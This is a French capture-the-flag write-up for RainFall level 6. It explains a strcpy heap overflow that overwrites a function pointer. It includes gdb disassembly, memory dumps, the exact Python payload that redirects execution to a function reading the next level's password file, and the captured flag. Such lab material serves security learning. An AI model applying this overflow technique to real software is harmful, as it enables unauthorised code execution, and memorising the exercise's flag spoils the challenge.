# Level 6

Voici le nouveau code décompilé :
```
void n(void)
{
  system("/bin/cat /home/user/level7/.pass");
  return;
}

void m(void *param_1,int param_2,char *param_3,int param_4,int param_5)

{
  puts("Nope");
  return;
}

void main(undefined4 param_1,int param_2)

{
  char *__dest;
  code **ppcVar1;
  __dest = (char *)malloc(0x40);
  ppcVar1 = (code **)malloc(4);
  *ppcVar1 = m;
  strcpy(__dest,*(char **)(param_2 + 4));
  (**ppcVar1)();
  return;
}
```
La vulnérabilité se trouve dans la fonction strcpy, où l'on peut écrire davantage que tampon alloué.
Ici "dest" qui est de 64 char.

Nous allons donc écraser l'adresse de retour sur le tas, par l'adresse de la fonction 'n'.

```
level6@RainFall:~$ python -c 'print "a"*64' > /tmp/exploit3
level6@RainFall:~$ gdb level6
(gdb) disas main
Dump of assembler code for function main:
   0x0804847c <+0>:	push   %ebp
   0x0804847d <+1>:	mov    %esp,%ebp
   0x0804847f <+3>:	and    $0xfffffff0,%esp
   0x08048482 <+6>:	sub    $0x20,%esp
   0x08048485 <+9>:	movl   $0x40,(%esp)
   0x0804848c <+16>:	call   0x8048350 <malloc@plt>
   0x08048491 <+21>:	mov    %eax,0x1c(%esp)
   0x08048495 <+25>:	movl   $0x4,(%esp)
   0x0804849c <+32>:	call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:	mov    %eax,0x18(%esp)
   0x080484a5 <+41>:	mov    $0x8048468,%edx
   0x080484aa <+46>:	mov    0x18(%esp),%eax
   0x080484ae <+50>:	mov    %edx,(%eax)
   0x080484b0 <+52>:	mov    0xc(%ebp),%eax
   0x080484b3 <+55>:	add    $0x4,%eax
   0x080484b6 <+58>:	mov    (%eax),%eax
   0x080484b8 <+60>:	mov    %eax,%edx
   0x080484ba <+62>:	mov    0x1c(%esp),%eax
   0x080484be <+66>:	mov    %edx,0x4(%esp)
   0x080484c2 <+70>:	mov    %eax,(%esp)
   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:	mov    0x18(%esp),%eax
   0x080484ce <+82>:	mov    (%eax),%eax
   0x080484d0 <+84>:	call   *%eax
   0x080484d2 <+86>:	leave
   0x080484d3 <+87>:	ret
End of assembler dump.

(gdb) b*0x080484ca
Breakpoint 1 at 0x80484ca

(gdb) run $(cat /tmp/exploit3)
Starting program: /home/user/level6/level6 $(cat /tmp/exploit3)

Breakpoint 1, 0x080484ca in main ()

(gdb) x/100wx $eax
0x804a008:	0x61616161	0x61616161	0x61616161	0x61616161
0x804a018:	0x61616161	0x61616161	0x61616161	0x61616161
0x804a028:	0x61616161	0x61616161	0x61616161	0x61616161
0x804a038:	0x61616161	0x61616161	0x61616161	0x61616161
0x804a048:	0x00000000	0x00000011	0x08048468	0x00000000
0x804a058:	0x00000000	0x00020fa9	0x00000000	0x00000000
```

L'adresse de retour est "0x08048468" et correspond à l'adresse de la fonction "m", nous allons remplacer cette adresse par celle de la fonction "n".

```
level6@RainFall:~$ python -c 'print "a"*72 + "\x54\x84\x04\x08"' > /tmp/exploit3
level6@RainFall:~$ /home/user/level6/level6 $(cat /tmp/exploit3)
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```